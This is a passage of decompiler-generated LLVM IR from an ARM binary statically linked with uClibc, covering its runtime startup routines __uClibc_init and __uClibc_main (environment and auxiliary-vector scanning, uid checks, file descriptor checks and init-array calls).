  br label %dec_label_pc_1e234

dec_label_pc_1e234:                               ; preds = %entry, %dec_label_pc_1e21c
  %v1_1e23c = phi i32 [ %v2_1e208, %entry ], [ %v2_1e228, %dec_label_pc_1e21c ]
  store i32 %v3_1e1f4, i32* @r4, align 4
  store i32 %v6_1e1f4, i32* @r5, align 4
  ret i32 %v1_1e23c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1e234, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1e248 = load i32, i32* @r4, align 4
  store i32 %v3_1e248, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r4.global-to-local, align 4
  %v4_1e258 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 148) to i32*), align 4
  %v1_1e25c = inttoptr i32 %v4_1e258 to i32*
  %v2_1e25c = load i32, i32* %v1_1e25c, align 4
  %v2_1e260 = icmp eq i32 %v2_1e25c, 0
  br i1 %v2_1e260, label %dec_label_pc_1e268, label %dec_label_pc_1e28c

dec_label_pc_1e268:                               ; preds = %entry
  store i32 4096, i32* %v1_1e25c, align 4
  %v0_1e270 = call i32 @__pthread_initialize_minimal()
  %v0_1e278 = load i32, i32* %r4.global-to-local, align 4
  %v2_1e278 = add i32 %v0_1e278, -50684
  %v2_1e280 = icmp eq i32 %v2_1e278, 0
  br i1 %v2_1e280, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_1e268
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_1e268, %bb
  %v2_1e288 = xor i1 %v2_1e280, true
  call void @__pseudo_cond_branch(i1 %v2_1e288, i32 %v2_1e278)
  %v2_1e28c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1e28c

dec_label_pc_1e28c:                               ; preds = %entry, %bb4
  %v2_1e28c = phi i32 [ %v2_1e28c.pre, %bb4 ], [ %v3_1e248, %entry ]
  %.0 = phi i32 [ %v0_1e270, %bb4 ], [ undef, %entry ]
  store i32 %v2_1e28c, i32* %r4.global-to-local, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder label %dec_label_pc_1e28c, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp62 = call i32 @__decompiler_undefined_function_0()
  %tmp63 = call i32 @__decompiler_undefined_function_0()
  %tmp64 = call i32 @__decompiler_undefined_function_0()
  %tmp65 = call i32 @__decompiler_undefined_function_0()
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-416 = alloca i32, align 4
  store i32 56656, i32* %r4.global-to-local, align 4
  %v1_1e2ac = add i32 %tmp, 4
  store i32 %v1_1e2ac, i32* %ip.global-to-local, align 4
  %v2_1e2b0 = load i32, i32* %arg3, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r4.global-to-local, align 4
  %v3_1e2bc = mul i32 %arg2, 4
  store i32 %v3_1e2bc, i32* @r7, align 4
  %v4_1e2c4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 24) to i32*), align 4
  store i32 %v4_1e2c4, i32* %r1.global-to-local, align 4
  store i32 56, i32* %r2.global-to-local, align 4
  %v2_1e2cc = add i32 %v1_1e2ac, %v3_1e2bc
  store i32 %v2_1e2cc, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %stack_var_-416, align 4
  %v4_1e2d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 56) to i32*), align 4
  store i32 %v4_1e2d4, i32* %r4.global-to-local, align 4
  %v3_1e2d8 = icmp uge i32 %v2_1e2cc, %v2_1e2b0
  store i1 %v3_1e2d8, i1* %cpsr_c.global-to-local, align 1
  %v9_1e2d8 = icmp eq i32 %v2_1e2cc, %v2_1e2b0
  store i1 %v9_1e2d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg7, i32* %r2.global-to-local, align 4
  %v2_1e2e0 = inttoptr i32 %v4_1e2d4 to i32*
  store i32 %v2_1e2cc, i32* %v2_1e2e0, align 4
  br i1 %v9_1e2d8, label %bb, label %bb75

bb:                                               ; preds = %entry
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br label %bb75

bb75:                                             ; preds = %entry, %bb
  %v0_1e2e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1e2e8 = load i32, i32* %r1.global-to-local, align 4
  %v2_1e2e8 = inttoptr i32 %v1_1e2e8 to i32*
  store i32 %v0_1e2e8, i32* %v2_1e2e8, align 4
  %v2_1e2ec = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1e2ec, i32* %r5.global-to-local, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  %v0_1e2f8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1e2f8, i32* @r6, align 4
  br i1 %v9_1e2d8, label %bb76, label %.thread52

.thread52:                                        ; preds = %bb75
  %v3_1e30053 = add i32 %v2_1e2ec, 2048
  %v4_1e30054 = inttoptr i32 %v3_1e30053 to i32*
  store i32 %arg6, i32* %v4_1e30054, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb77

bb76:                                             ; preds = %bb75
  %v1_1e2fc = load i32, i32* %ip.global-to-local, align 4
  %v2_1e2fc = load i32, i32* @r7, align 4
  %v3_1e2fc = add i32 %v2_1e2fc, %v1_1e2fc
  store i32 %v3_1e2fc, i32* %r3.global-to-local, align 4
  %v3_1e30050 = add i32 %v2_1e2ec, 2048
  %v4_1e30051 = inttoptr i32 %v3_1e30050 to i32*
  store i32 %arg6, i32* %v4_1e30051, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_1e30c = load i32, i32* %r3.global-to-local, align 4
  %v2_1e30c = load i32, i32* %r4.global-to-local, align 4
  %v3_1e30c = inttoptr i32 %v2_1e30c to i32*
  store i32 %v1_1e30c, i32* %v3_1e30c, align 4
  br label %bb77

bb77:                                             ; preds = %.thread52, %bb76
  %v2_1e310 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1e310, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r2.global-to-local, align 4
  %v3_1e318 = bitcast i32* %stack_var_-120 to i8*
  %v4_1e318 = call i32 @__GI_memset(i8* %v3_1e318, i32 0, i32 120)
  store i32 %v4_1e318, i32* %r0.global-to-local, align 4
  %v0_1e31c = load i32, i32* %r4.global-to-local, align 4
  %v1_1e31c = inttoptr i32 %v0_1e31c to i32*
  %v2_1e31c = load i32, i32* %v1_1e31c, align 4
  br label %dec_label_pc_1e328

dec_label_pc_1e328:                               ; preds = %dec_label_pc_1e328, %bb77
  %storemerge = phi i32 [ %v2_1e31c, %bb77 ], [ %v1_1e334, %dec_label_pc_1e328 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_1e328 = inttoptr i32 %storemerge to i32*
  %v2_1e328 = load i32, i32* %v1_1e328, align 4
  store i32 %v2_1e328, i32* %r3.global-to-local, align 4
  %v2_1e32c = icmp eq i32 %v2_1e328, 0
  %v1_1e334 = add i32 %storemerge, 4
  br i1 %v2_1e32c, label %dec_label_pc_1e334, label %dec_label_pc_1e328

dec_label_pc_1e334:                               ; preds = %dec_label_pc_1e328
  store i32 %v1_1e334, i32* @r4, align 4
  store i32 %v2_1e310, i32* @r5, align 4
  %v1_1e35830 = inttoptr i32 %v1_1e334 to i32*
  %v2_1e35831 = load i32, i32* %v1_1e35830, align 4
  store i32 %v2_1e35831, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1e35c33 = icmp eq i32 %v2_1e35831, 0
  store i1 %v2_1e35c33, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1e35c33, label %dec_label_pc_1e364, label %dec_label_pc_1e340

dec_label_pc_1e340:                               ; preds = %dec_label_pc_1e334, %dec_label_pc_1e358
  %v4_1e348 = phi i32 [ %v1_1e354, %dec_label_pc_1e358 ], [ %v1_1e334, %dec_label_pc_1e334 ]
  %v5_1e344 = phi i32 [ %v2_1e358, %dec_label_pc_1e358 ], [ %v2_1e35831, %dec_label_pc_1e334 ]
  %v2_1e340 = icmp ugt i32 %v5_1e344, 13
  store i1 %v2_1e340, i1* %cpsr_c.global-to-local, align 1
  %v7_1e340 = icmp eq i32 %v5_1e344, 14
  store i1 %v7_1e340, i1* %cpsr_z.global-to-local, align 1
  %v2_1e344 = xor i1 %v2_1e340, true
  %v3_1e344 = or i1 %v7_1e340, %v2_1e344
  br i1 %v3_1e344, label %bb78, label %bb79

bb78:                                             ; preds = %dec_label_pc_1e340
  %v4_1e344 = load i32, i32* @r5, align 4
  %v6_1e344 = and i32 %v5_1e344, 536870912
  %v7_1e344 = icmp ne i32 %v6_1e344, 0
  store i1 %v7_1e344, i1* %cpsr_c.global-to-local, align 1
  %v8_1e344 = mul i32 %v5_1e344, 8
  %v9_1e344 = add i32 %v4_1e344, %v8_1e344
  store i32 %v9_1e344, i32* %r0.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_1e340, %bb78
  %v1_1e350 = phi i1 [ %v2_1e340, %dec_label_pc_1e340 ], [ %v7_1e344, %bb78 ]
  %v2_1e348 = xor i1 %v1_1e350, true
  %v3_1e348 = or i1 %v7_1e340, %v2_1e348
  br i1 %v3_1e348, label %bb80, label %dec_label_pc_1e358

bb80:                                             ; preds = %bb79
  store i32 %v4_1e348, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1e358

dec_label_pc_1e358:                               ; preds = %bb79, %bb80
  call void @__pseudo_cond_branch(i1 %v3_1e348, i32 ptrtoint (i32* @global_var_1ace0.621 to i32))
  %v0_1e354 = load i32, i32* @r4, align 4
  %v1_1e354 = add i32 %v0_1e354, 8
  store i32 %v1_1e354, i32* @r4, align 4
  %v1_1e358 = inttoptr i32 %v1_1e354 to i32*
  %v2_1e358 = load i32, i32* %v1_1e358, align 4
  store i32 %v2_1e358, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1e35c = icmp eq i32 %v2_1e358, 0
  store i1 %v2_1e35c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1e35c, label %dec_label_pc_1e364, label %dec_label_pc_1e340

dec_label_pc_1e364:                               ; preds = %dec_label_pc_1e358, %dec_label_pc_1e334
  store i32 %v2_1e310, i32* %r0.global-to-local, align 4
  %v1_1e368 = call i32 @_dl_aux_init(i32 %v2_1e310)
  store i32 %v1_1e368, i32* %r0.global-to-local, align 4
  %v1_1e36c = call i32 @__GI___uClibc_init(i32 %v1_1e368)
  store i32 %v1_1e36c, i32* @r0, align 4
  store i32 148, i32* %r3.global-to-local, align 4
  %v2_1e374 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1e374, i32* @lr, align 4
  store i32 %tmp66, i32* @r2, align 4
  %v2_1e37c = add i32 %v2_1e374, 148
  %v3_1e37c = inttoptr i32 %v2_1e37c to i32*
  %v4_1e37c = load i32, i32* %v3_1e37c, align 4
  store i32 %v4_1e37c, i32* %r1.global-to-local, align 4
  store i32 %tmp65, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1e384 = icmp eq i32 %tmp66, 0
  store i1 %v2_1e384, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1e384, label %bb81, label %bb82

bb81:                                             ; preds = %dec_label_pc_1e364
  store i32 4096, i32* @r2, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_1e364, %bb81
  %v0_1e390 = phi i32 [ %tmp66, %dec_label_pc_1e364 ], [ 4096, %bb81 ]
  %v3_1e38c = icmp eq i32 %tmp65, -1
  store i1 %v3_1e38c, i1* %cpsr_c.global-to-local, align 1
  %v8_1e38c = icmp eq i32 %tmp65, -1
  store i1 %v8_1e38c, i1* %cpsr_z.global-to-local, align 1
  %v2_1e390 = inttoptr i32 %v4_1e37c to i32*
  store i32 %v0_1e390, i32* %v2_1e390, align 4
  br i1 %v3_1e38c, label %dec_label_pc_1e398, label %dec_label_pc_1e3c0

dec_label_pc_1e398:                               ; preds = %bb82
  %v0_1e398 = call i32 @getuid()
  store i32 %v0_1e398, i32* @r0, align 4
  store i32 %v0_1e398, i32* %r4.global-to-local, align 4
  %v0_1e3a0 = call i32 @geteuid()
  store i32 %v0_1e3a0, i32* @r0, align 4
  %v3_1e3a4 = icmp uge i32 %v0_1e398, %v0_1e3a0
  store i1 %v3_1e3a4, i1* %cpsr_c.global-to-local, align 1
  %v9_1e3a4 = icmp eq i32 %v0_1e398, %v0_1e3a0
  store i1 %v9_1e3a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1e3a4, label %dec_label_pc_1e3ac, label %dec_label_pc_1e3e8

dec_label_pc_1e3ac:                               ; preds = %dec_label_pc_1e398
  %v1_1e3ac = call i32 @getgid(i32 %v0_1e3a0)
  store i32 %v1_1e3ac, i32* @r0, align 4
  store i32 %v1_1e3ac, i32* %r4.global-to-local, align 4
  %v0_1e3b4 = call i32 @getegid()
  store i32 %v0_1e3b4, i32* %r0.global-to-local, align 4
  %v3_1e3b8 = icmp uge i32 %v1_1e3ac, %v0_1e3b4
  store i1 %v3_1e3b8, i1* %cpsr_c.global-to-local, align 1
  %v9_1e3b8 = icmp eq i32 %v1_1e3ac, %v0_1e3b4
  store i1 %v9_1e3b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1e3b8, label %dec_label_pc_1e3c0, label %dec_label_pc_1e3e8

dec_label_pc_1e3c0:                               ; preds = %dec_label_pc_1e3ac, %bb82
  store i32 %tmp65, i32* @r2, align 4
  store i1 %v3_1e38c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v8_1e38c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1e38c, label %dec_label_pc_1e410, label %dec_label_pc_1e3cc

dec_label_pc_1e3cc:                               ; preds = %dec_label_pc_1e3c0
  store i32 %tmp64, i32* @r3, align 4
  %v3_1e3d0 = icmp uge i32 %tmp65, %tmp64
  store i1 %v3_1e3d0, i1* %cpsr_c.global-to-local, align 1
  %v9_1e3d0 = icmp eq i32 %tmp65, %tmp64
  store i1 %v9_1e3d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1e3d0, label %dec_label_pc_1e3d8, label %dec_label_pc_1e3e8

dec_label_pc_1e3d8:                               ; preds = %dec_label_pc_1e3cc
  store i32 %tmp63, i32* @r2, align 4
  store i32 %tmp62, i32* @r3, align 4
  %v3_1e3e0 = icmp uge i32 %tmp63, %tmp62
  store i1 %v3_1e3e0, i1* %cpsr_c.global-to-local, align 1
  %v9_1e3e0 = icmp eq i32 %tmp63, %tmp62
  store i1 %v9_1e3e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1e3e0, label %dec_label_pc_1e410, label %dec_label_pc_1e3e8

dec_label_pc_1e3e8:                               ; preds = %dec_label_pc_1e3cc, %dec_label_pc_1e3ac, %dec_label_pc_1e398, %dec_label_pc_1e3d8
  store i32 32770, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_1e3f4 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1e3fc = load i32, i32* @r4, align 4
  store i32 %v0_1e3fc, i32* %r1.global-to-local, align 4
  %v2_1e400 = call i32 @__check_one_fd(i32 1, i32 %v0_1e3fc)
  %v0_1e404 = load i32, i32* @r4, align 4
  store i32 %v0_1e404, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_1e40c = call i32 @__check_one_fd(i32 2, i32 %v0_1e404)
  store i32 %v2_1e40c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1e410

dec_label_pc_1e410:                               ; preds = %dec_label_pc_1e3d8, %dec_label_pc_1e3c0, %dec_label_pc_1e3e8
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 268, i32* %r3.global-to-local, align 4
  %v2_1e418 = load i32, i32* %arg3, align 4
  store i32 %v2_1e418, i32* %r2.global-to-local, align 4
  %v2_1e41c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1e41c, i32* %r1.global-to-local, align 4
  %v3_1e420 = add i32 %v2_1e41c, 268
  %v4_1e420 = inttoptr i32 %v3_1e420 to i32*
  store i32 %v2_1e418, i32* %v4_1e420, align 4
  %v0_1e424 = load i32, i32* %r0.global-to-local, align 4
  %v1_1e424 = inttoptr i32 %v0_1e424 to i32*
  %v2_1e424 = load i32, i32* %v1_1e424, align 4
  store i32 %v2_1e424, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1e428 = icmp eq i32 %v2_1e424, 0
  store i1 %v2_1e428, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1e428, label %bb84, label %dec_label_pc_1e430

dec_label_pc_1e430:                               ; preds = %dec_label_pc_1e410
  store i32 164, i32* %r3.global-to-local, align 4
  %v0_1e434 = load i32, i32* %r1.global-to-local, align 4
  %v2_1e434 = add i32 %v0_1e434, 164
  %v3_1e434 = inttoptr i32 %v2_1e434 to i32*
  %v4_1e434 = load i32, i32* %v3_1e434, align 4
  store i32 %v4_1e434, i32* %r3.global-to-local, align 4
  %v2_1e438 = inttoptr i32 %v4_1e434 to i32*
  store i32 %v2_1e424, i32* %v2_1e438, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_1e440 = load i32, i32* %r0.global-to-local, align 4
  %v1_1e440 = inttoptr i32 %v0_1e440 to i32*
  %v2_1e440 = load i32, i32* %v1_1e440, align 4
  store i32 %v2_1e440, i32* %r0.global-to-local, align 4
  %v4_1e444 = call i32 @__GI_strrchr(i32 %v2_1e440, i32 47, i32 %v2_1e418, i32 %v4_1e434)
  store i32 %v4_1e444, i32* %r0.global-to-local, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  %v2_1e44c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1e44c, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1e450 = icmp eq i32 %v4_1e444, 0
  store i1 %v2_1e450, i1* %cpsr_z.global-to-local, align 1
  %v2_1e454 = add i32 %v2_1e44c, 96
  %v3_1e454 = inttoptr i32 %v2_1e454 to i32*
  %v4_1e454 = load i32, i32* %v3_1e454, align 4
  store i32 %v4_1e454, i32* %r2.global-to-local, align 4
  br i1 %v2_1e450, label %.thread57, label %bb83

.thread57:                                        ; preds = %dec_label_pc_1e430
  %v2_1e45c58 = inttoptr i32 %v4_1e454 to i32*
  store i32 0, i32* %v2_1e45c58, align 4
  br label %bb84

bb83:                                             ; preds = %dec_label_pc_1e430
  %v2_1e458 = add i32 %v4_1e444, 1
  store i32 %v2_1e458, i32* %r3.global-to-local, align 4
  %v2_1e45c = inttoptr i32 %v4_1e454 to i32*
  store i32 %v4_1e444, i32* %v2_1e45c, align 4
  %v1_1e460 = load i32, i32* %r3.global-to-local, align 4
  %v2_1e460 = load i32, i32* %r2.global-to-local, align 4
  %v3_1e460 = inttoptr i32 %v2_1e460 to i32*
  store i32 %v1_1e460, i32* %v3_1e460, align 4
  br label %bb84

bb84:                                             ; preds = %.thread57, %bb83, %dec_label_pc_1e410
  %v2_1e470 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1e470, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_1e47c = add i32 %v2_1e470, -12
  store i32 %v2_1e47c, i32* %r5.global-to-local, align 4
  store i32 2044, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_1e48c = add i32 %v2_1e470, 2044
  %v4_1e48c = inttoptr i32 %v3_1e48c to i32*
  store i32 %arg5, i32* %v4_1e48c, align 4
  %v0_1e4a418 = load i32, i32* %r4.global-to-local, align 4
  %v1_1e4a419 = load i32, i32* %r7.global-to-local, align 4
  %v3_1e4a421 = icmp uge i32 %v0_1e4a418, %v1_1e4a419
  store i1 %v3_1e4a421, i1* %cpsr_c.global-to-local, align 1
  %v9_1e4a427 = icmp eq i32 %v0_1e4a418, %v1_1e4a419
  store i1 %v9_1e4a427, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1e4a421, label %dec_label_pc_1e4d8.lr.ph, label %dec_label_pc_1e494

dec_label_pc_1e494:                               ; preds = %bb84, %dec_label_pc_1e494
  %v1_1e494 = phi i32 [ %v1_1e4a0, %dec_label_pc_1e494 ], [ %v0_1e4a418, %bb84 ]
  %v0_1e494 = load i32, i32* %r5.global-to-local, align 4
  %v2_1e494 = and i32 %v1_1e494, 1073741824
  %v3_1e494 = icmp ne i32 %v2_1e494, 0
  store i1 %v3_1e494, i1* %cpsr_c.global-to-local, align 1
  %v4_1e494 = mul i32 %v1_1e494, 4
  %v5_1e494 = add i32 %v4_1e494, %v0_1e494
  %v6_1e494 = inttoptr i32 %v5_1e494 to i32*
  %v7_1e494 = load i32, i32* %v6_1e494, align 4
  store i32 %v7_1e494, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_1e494)
  %v0_1e4a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1e4a0 = add i32 %v0_1e4a0, 1
  store i32 %v1_1e4a0, i32* %r4.global-to-local, align 4
  %v1_1e4a4 = load i32, i32* %r7.global-to-local, align 4
  %v3_1e4a4 = icmp uge i32 %v1_1e4a0, %v1_1e4a4
  store i1 %v3_1e4a4, i1* %cpsr_c.global-to-local, align 1
  %v9_1e4a4 = icmp eq i32 %v1_1e4a0, %v1_1e4a4
  store i1 %v9_1e4a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1e4a4, label %dec_label_pc_1e4d8.lr.ph, label %dec_label_pc_1e494

dec_label_pc_1e4d8.lr.ph:                         ; preds = %dec_label_pc_1e494, %bb84
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1e4ac = icmp eq i32 %v0_1e2f8, 0
  store i1 %v2_1e4ac, i1* %cpsr_z.global-to-local, align 1
  %v2_1e4b4 = xor i1 %v2_1e4ac, true
  call void @__pseudo_cond_branch(i1 %v2_1e4b4, i32 %v0_1e2f8)
  store i32 -12, i32* %r2.global-to-local, align 4
  %v2_1e4c0 = load i32, i32* %stack_var_-416, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v2_1e4cc = add i32 %v2_1e4c0, -12
  store i32 %v2_1e4cc, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1e4d8

dec_label_pc_1e4d8:                               ; preds = %dec_label_pc_1e4d8.dec_label_pc_1e4d8_crit_edge, %dec_label_pc_1e4d8.lr.ph
  %v1_1e4d8 = phi i32 [ %v1_1e4e4, %dec_label_pc_1e4d8.dec_label_pc_1e4d8_crit_edge ], [ 0, %dec_label_pc_1e4d8.lr.ph ]
  %v0_1e4d8 = phi i32 [ %v0_1e4d8.pre, %dec_label_pc_1e4d8.dec_label_pc_1e4d8_crit_edge ], [ %v2_1e4cc, %dec_label_pc_1e4d8.lr.ph ]
  %v2_1e4d8 = and i32 %v1_1e4d8, 1073741824
  %v3_1e4d8 = icmp ne i32 %v2_1e4d8, 0
  store i1 %v3_1e4d8, i1* %cpsr_c.global-to-local, align 1
  %v4_1e4d8 = mul i32 %v1_1e4d8, 4
  %v5_1e4d8 = add i32 %v4_1e4d8, %v0_1e4d8
  %v6_1e4d8 = inttoptr i32 %v5_1e4d8 to i32*
  %v7_1e4d8 = load i32, i32* %v6_1e4d8, align 4
  store i32 %v7_1e4d8, i32* %ip.global-to-local, align 4
  store i32 124132, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_1e4d8)
  %v0_1e4e4 = load i32, i32* @r4, align 4
  %v1_1e4e4 = add i32 %v0_1e4e4, 1
  store i32 %v1_1e4e4, i32* @r4, align 4
  %v1_1e4e8 = load i32, i32* @r7, align 4
  %v3_1e4e8 = icmp uge i32 %v1_1e4e4, %v1_1e4e8
  store i1 %v3_1e4e8, i1* %cpsr_c.global-to-local, align 1
  %v9_1e4e8 = icmp eq i32 %v1_1e4e4, %v1_1e4e8
  store i1 %v9_1e4e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1e4e8, label %dec_label_pc_1e4f0, label %dec_label_pc_1e4d8.dec_label_pc_1e4d8_crit_edge

dec_label_pc_1e4d8.dec_label_pc_1e4d8_crit_edge:  ; preds = %dec_label_pc_1e4d8
  %v0_1e4d8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1e4d8

dec_label_pc_1e4f0:                               ; preds = %dec_label_pc_1e4d8
  %v2_1e4f4.pre = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1e4f4.pre, i32* %r0.global-to-local, align 4
  %v2_1e4f8 = add i32 %v2_1e4f4.pre, -70532
  store i32 %v2_1e4f8, i32* %r2.global-to-local, align 4
  store i32 %v2_1e4f8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1e500 = icmp eq i32 %v2_1e4f8, 0
  store i1 %v2_1e500, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1e500, label %dec_label_pc_1e518, label %dec_label_pc_1e508

dec_label_pc_1e508:                               ; preds = %dec_label_pc_1e4f0
  store i32 124176, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_1e4f8)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1e514 = load i32, i32* %r0.global-to-local, align 4
  %v2_1e514 = inttoptr i32 %v1_1e514 to i32*
  store i32 0, i32* %v2_1e514, align 4
  %v2_1e51c.pre = load i32, i32* %stack_var_-416, align 4
  br label %dec_label_pc_1e518

dec_label_pc_1e518:                               ; preds = %dec_label_pc_1e4f0, %dec_label_pc_1e508
  %v2_1e51c = phi i32 [ %v2_1e4f4.pre, %dec_label_pc_1e4f0 ], [ %v2_1e51c.pre, %dec_label_pc_1e508 ]
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 %v2_1e51c, i32* %r1.global-to-local, align 4
  %v2_1e520 = add i32 %v2_1e51c, 128
  %v3_1e520 = inttoptr i32 %v2_1e520 to i32*
  %v4_1e520 = load i32, i32* %v3_1e520, align 4
  store i32 %v4_1e520, i32* %r2.global-to-local, align 4
  store i32 %v4_1e520, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1e528 = icmp eq i32 %v4_1e520, 0
  store i1 %v2_1e528, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1e528, label %dec_label_pc_1e540, label %dec_label_pc_1e530

dec_label_pc_1e530:                               ; preds = %dec_label_pc_1e518
  store i32 124216, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1e520)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1e53c = load i32, i32* %r0.global-to-local, align 4
  %v2_1e53c = inttoptr i32 %v1_1e53c to i32*
  store i32 0, i32* %v2_1e53c, align 4
  br label %dec_label_pc_1e540

dec_label_pc_1e540:                               ; preds = %dec_label_pc_1e518, %dec_label_pc_1e530
  %v2_1e540 = ptrtoint i32* %stack_var_-400 to i32
  store i32 %v2_1e540, i32* @r0, align 4
  %v1_1e544 = call i32 @_setjmp(i32 %v2_1e540)
  store i32 %v1_1e544, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1e548 = icmp eq i32 %v1_1e544, 0
  store i1 %v2_1e548, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1e548, label %dec_label_pc_1e550, label %dec_label_pc_1e59c

dec_label_pc_1e550:                               ; preds = %dec_label_pc_1e540
  %v0_1e550 = call i32 @__aeabi_read_tp()
  store i32 %v0_1e550, i32* %r0.global-to-local, align 4
  %v1_1e554 = add i32 %v0_1e550, -1168
  store i32 %v1_1e554, i32* %r2.global-to-local, align 4
  %v2_1e55c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1e55c, i32* %r4.global-to-local, align 4
  store i32 56, i32* %r3.global-to-local, align 4
  %v2_1e568 = add i32 %v2_1e55c, 56
  %v3_1e568 = inttoptr i32 %v2_1e568 to i32*
  %v4_1e568 = load i32, i32* %v3_1e568, align 4
